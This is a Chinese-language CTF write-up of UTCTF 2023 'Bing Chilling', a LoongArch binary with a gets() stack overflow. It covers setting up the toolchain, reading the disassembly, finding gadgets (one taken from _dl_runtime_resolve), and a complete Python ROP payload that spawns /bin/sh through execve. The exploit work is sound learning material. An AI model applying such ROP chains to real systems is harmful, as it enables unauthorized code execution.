---
layout: post
title: UTCTF 2023 Bing Chilling
date: 2023-04-04 13:19:34
tags: pwn loongarch rop
---

Loongarch ROP

比赛时发现了这是LoongArch的ROP，由于不太会找gadget就放弃了。赛后看大佬的writeup，发现只要找到一个关键的来自_dl_runtime_resolve的gadget，就可以万事大吉了。

复现参考：[CTFtime.org / UTCTF 2023 / Bing Chilling / Writeup](https://ctftime.org/writeup/36285)

---

## 环境准备

我们都知道 Linux 下的可执行文件是 ELF 格式，但 ELF 也分架构，比如这个 binary 就是 Loongarch 龙架构。

```sh
$ file hello
hello: ELF 64-bit LSB executable, *unknown arch 0x102* version 1 (SYSV), statically linked, for GNU/Linux 5.19.0, with debug_info, not stripped
```

可以看到其 ELF Header 中的 arch 字段值为 0x102，是一个 file 未知的架构。在网上查询 0x102，可以知道这是龙架构。为了调试这个 binary，我们需要一台龙架构真机……或者是一个龙芯模拟器。此外，我们还需要能够静态分析这个 binary 的工具，比如 objdump。

著名的模拟器 qemu 在其 7.1.0 版本引入了对龙架构模拟的支持，因此我们安装下最新的 qemu 就行了。
从 [Releases · loongson/build-tools (github.com)](https://github.com/loongson/build-tools/releases/) 这里可以找到一些龙架构的交叉编译（跨架构生成 ELF）的工具，其中就包括龙架构的 objdump。
最后，为了动态调试，可能还需要一个支持龙架构的 gdb。gdb 在 13.1 版本引入了对龙架构调试的支持，可以通过下面的指令来在 /opt/gdb 目录下编译支持龙架构的 gdb（中途遇到报错多半是缺少某个库，可以上网搜）（执行指令的位置无所谓，不过在 root 的目录下需要加很多 sudo ……）：

```sh
wget https://ftp.gnu.org/gnu/gdb/gdb-13.1.tar.xz
tar xf gdb-13.1.tar.xz
cd gdb-13.1
mkdir build
cd build
../configure --target=loongarch64-unknown-linux-gnu --prefix=/opt/gdb
make
sudo make install
```

编译得到的 gdb 位于 `/opt/gdb/bin/loongarch64-unknown-linux-gnu-gdb`

## 程序分析

学过 mips 和 riscv 的朋友会对 LoongArch 的指令集感到比较熟悉，LoongArch 也是 risc。它的寄存器昵称和 riscv 的几乎一模一样，比如存放 return address 的 ra。
从 pwner 的视角来看，龙架构：

- 系统调用的参数依次存放在 **a0**, **a1**, **a2**, **a3**, **a4**, ……
- 系统调用编号存放在：**a7**
- 返回地址存放在 **ra** 寄存器中
	返回指令是 `jirl $zero, $ra, 0`  
- `bl` 用作 call，先把返回地址存到 **ra** 然后跳转到目标地址
- syscall 指令就是 **syscall**

使用 cross tool 中的 objdump 可以查看 binary 的汇编，我们直接看 main 函数：
```asm
0000000120000520 <main>:
   120000520:	02fec063 	addi.d      	$sp, $sp, -80(0xfb0)
   120000524:	29c12061 	st.d        	$ra, $sp, 72(0x48)
   120000528:	29c10076 	st.d        	$fp, $sp, 64(0x40)
   12000052c:	02c14076 	addi.d      	$fp, $sp, 80(0x50)
   120000530:	1a000b0c 	pcalau12i   	$t0, 88(0x58)
   120000534:	02e46184 	addi.d      	$a0, $t0, -1768(0x918)
   120000538:	54bf0000 	bl          	48896(0xbf00)	# 12000c438 <_IO_puts>
   12000053c:	02fec2cc 	addi.d      	$t0, $fp, -80(0xfb0)
   120000540:	00150184 	move        	$a0, $t0
   120000544:	54bb5400 	bl          	47956(0xbb54)	# 12000c098 <_IO_gets>
   120000548:	02fec2cc 	addi.d      	$t0, $fp, -80(0xfb0)
   12000054c:	00150185 	move        	$a1, $t0
   120000550:	1a000b0c 	pcalau12i   	$t0, 88(0x58)
   120000554:	02e4e184 	addi.d      	$a0, $t0, -1736(0x938)
   120000558:	54651800 	bl          	25880(0x6518)	# 120006a70 <_IO_printf>
   12000055c:	0015000c 	move        	$t0, $zero
   120000560:	00150184 	move        	$a0, $t0
   120000564:	28c12061 	ld.d        	$ra, $sp, 72(0x48)
   120000568:	28c10076 	ld.d        	$fp, $sp, 64(0x40)
   12000056c:	02c14063 	addi.d      	$sp, $sp, 80(0x50)
   120000570:	4c000020 	jirl        	$zero, $ra, 0
```

从中可以观察到很多经典的过程调用行为，比如开始时拓展栈空间、存放返回地址等信息；结束时取回返回地址、恢复栈空间。毕竟栈这种 LIFO 的结构对于过程调用还是非常根本的。
注意到，main 函数会依次调用 puts、**gets** 和 printf。有 gets 不就可以直接栈溢出了吗？
使用 `qemu-loongarch64 hello`，然后输入一大段 A，果然 qemu 报了 segmentation fault。

接下来的问题就是，我们已经能够控制栈了，那么 LoongArch 的栈上可以 ROP 吗？答案是可以。虽然 LoongArch 有专门用来存返回地址的 ra 寄存器，但很多过程仍然会把返回地址存到栈上，这是因为这些过程自己也需要调用其他的过程。因此，LoongArch 过程的结束既有从栈上读取返回地址，又有返回指令，可以进行 ROP。

## 漏洞利用


我们的目标是 get shell，但这个 hello 虽然是静态链接的，却没有 system 函数。不过，我们可以直接找到 syscall gadget：

```asm
   120013e4c:	002b0000 	syscall     	0x0
   120013e50:	4c000020 	jirl        	$zero, $ra, 0
```

至于 LoongArch Linux 的 Syscall Table，我好像只在 [[6/14, LoongArch] Linux Syscall Interface - Patchwork (ozlabs. Org)](https://patchwork.ozlabs.org/project/glibc/patch/CAKjxQHnS02h5Vo3Pm-+ESmqYqZ6FDY7ykty4KROBeondHVfmOQ@mail.gmail.com/) 有看到，其中 execve 是 221。
只要能够控制 \$a0 指向一个 "/bin/sh" 的字符串，\$a1 和 \$a2 控制为 0，就可以 get shell。我们需要为此找到合适的 gadget。

从本文参考的文章那边找到了一个非常牛逼的 gadget，来自 \_dl_runtime_resolve 函数：

```asm
   120048098:   0015008d        move            $t1, $a0
   12004809c:   28c12061        ld.d            $ra, $sp, 72(0x48)
   1200480a0:   28c02064        ld.d            $a0, $sp, 8(0x8)
   1200480a4:   28c04065        ld.d            $a1, $sp, 16(0x10)
   1200480a8:   28c06066        ld.d            $a2, $sp, 24(0x18)
   1200480ac:   28c08067        ld.d            $a3, $sp, 32(0x20)
   1200480b0:   28c0a068        ld.d            $a4, $sp, 40(0x28)
   1200480b4:   28c0c069        ld.d            $a5, $sp, 48(0x30)
   1200480b8:   28c0e06a        ld.d            $a6, $sp, 56(0x38)
   1200480bc:   28c1006b        ld.d            $a7, $sp, 64(0x40)
   1200480c0:   2b814060        fld.d           $fa0, $sp, 80(0x50)
   1200480c4:   2b816061        fld.d           $fa1, $sp, 88(0x58)
   1200480c8:   2b818062        fld.d           $fa2, $sp, 96(0x60)
   1200480cc:   2b81a063        fld.d           $fa3, $sp, 104(0x68)
   1200480d0:   2b81c064        fld.d           $fa4, $sp, 112(0x70)
   1200480d4:   2b81e065        fld.d           $fa5, $sp, 120(0x78)
   1200480d8:   2b820066        fld.d           $fa6, $sp, 128(0x80)
   1200480dc:   2b822067        fld.d           $fa7, $sp, 136(0x88)
   1200480e0:   02c24063        addi.d          $sp, $sp, 144(0x90)
   1200480e4:   4c0001a0        jirl            $zero, $t1, 0
```

似乎不管在哪个架构中，\_dl_runtime_resolve 函数的功能都是保存寄存器的值到栈中，然后调用\_dl_fixup执行具体的功能，然后从栈中恢复寄存器。因此以后要是遇到了什么riscv pwn，也可以使用这个gadget。
这个 gadget 能够控制所有参数寄存器，但需要提前把返回地址存在 \$a0 中。所以继续手工找 gadget：

```asm
   12000bc54:   28c0a061        ld.d            $ra, $sp, 40(0x28)
   12000bc58:   28c08077        ld.d            $s0, $sp, 32(0x20)
   12000bc5c:   28c04079        ld.d            $s2, $sp, 16(0x10)
   12000bc60:   28c0207a        ld.d            $s3, $sp, 8(0x8)
   12000bc64:   00150304        move            $a0, $s1
   12000bc68:   28c06078        ld.d            $s1, $sp, 24(0x18)
   12000bc6c:   02c0c063        addi.d          $sp, $sp, 48(0x30)
   12000bc70:   4c000020        jirl            $zero, $ra, 0
```

这个 gadget 可以把 \$s1 移到 \$a0 ，那就继续找可以改 \$s1 的 gadget：

```asm
   12000be90:   28c06061        ld.d            $ra, $sp, 24(0x18)
   12000be94:   0012e004        sltu            $a0, $zero, $s1
   12000be98:   28c04077        ld.d            $s0, $sp, 16(0x10)
   12000be9c:   28c02078        ld.d            $s1, $sp, 8(0x8)
   12000bea0:   00119004        sub.d           $a0, $zero, $a0
   12000bea4:   02c08063        addi.d          $sp, $sp, 32(0x20)
   12000bea8:   4c000020        jirl            $zero, $ra, 0
```

有了这三个 gadget，齐活了！我们拥有了执行任意函数、任意 syscall 的能力。
接下来就是 exp 了，思路是首先把 "/bin/sh"读入到已知地址（程序关闭了 PIE），比如 bss 段，然后用 syscall gadget 来 get shell。前者我们可以通过 return to gets 来实现。

```python
g1 = 0x12000bc54
g2 = 0x12000be90
g3 = 0x120048098
sys = 0x120013e4c
buf_addr = 0x120087000
gets_addr = 0x12000c098


def pwn():
    payload = b"A" * 72
    payload += flat([
        g2,
        0, gets_addr, 0
    ])
    payload += flat([
        g1,
        0, 0, 0, 0, 0,
    ])
    payload += flat([
        g3,
        0, buf_addr, 0, 0, 0, 0, 0, 0, 0,
        g2,
        0, 0, 0, 0, 0, 0, 0, 0,
    ])
    payload += flat([
        0, sys, 0
    ])
    payload += flat([
        g1,
        0, 0, 0, 0, 0,
    ])
    payload += flat([
        g3,
        0, buf_addr, 0, 0, 0, 0, 0, 0, 221,
        g2,
        0, 0, 0, 0, 0, 0, 0, 0,
    ])

    io.sendline(payload)
    io.sendline("/bin/sh\x00")
    io.interactive()
```
